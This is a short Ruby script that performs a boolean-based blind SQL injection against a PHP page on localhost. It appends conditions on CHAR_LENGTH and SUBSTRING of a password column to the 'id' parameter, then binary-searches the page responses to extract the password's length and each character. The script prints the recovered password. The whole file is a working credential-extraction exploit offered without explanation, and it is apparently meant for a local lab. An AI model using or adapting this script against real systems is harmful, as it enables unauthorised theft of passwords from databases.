require 'open-uri'

END {    
    total_request = 0
    password_length = guess_value{ |value|
        total_request+=1
        URI.open("http://localhost:8000/active.php?id=#{ARGV.first} and CHAR_LENGTH(password) > #{value}").read.include?  "is"
    }
    puts "the length is: #{password_length}"
    
    password = find_password(password_length){ |n,byte|
        total_request+=1
        URI.open("http://localhost:8000/active.php?id=#{ARGV.first} and SUBSTRING(password,#{n},1) collate utf8_bin >  CHAR(#{byte} USING UCS2)").read.include?  "account"
    }
    puts "\nthe password is: #{password}"
    puts "total of request: #{total_request}"
}

SQL_WILDCARDS="%_[]^-'"
def guess_value
    max_value = 1
    max_value *= 2 while yield max_value
    min_value = max_value / 2
    
    loop do
        value = (max_value - min_value) / 2 + min_value
        is_biggest = yield value
        if is_biggest
            min_value = value
        else
            max_value = value
        end 
        if (max_value - min_value) <= 1
            return max_value  
        end
    end
end

def find_password password_length
    password=""
    password_length.times do |n|
        password+=guess_value { |byte| 
            yield n+1,byte
        }.chr(Encoding::UTF_8) 
        print "\rPassword : #{password.sub(/[^[:print:]]/,"")}"
    end
    puts
    return password
end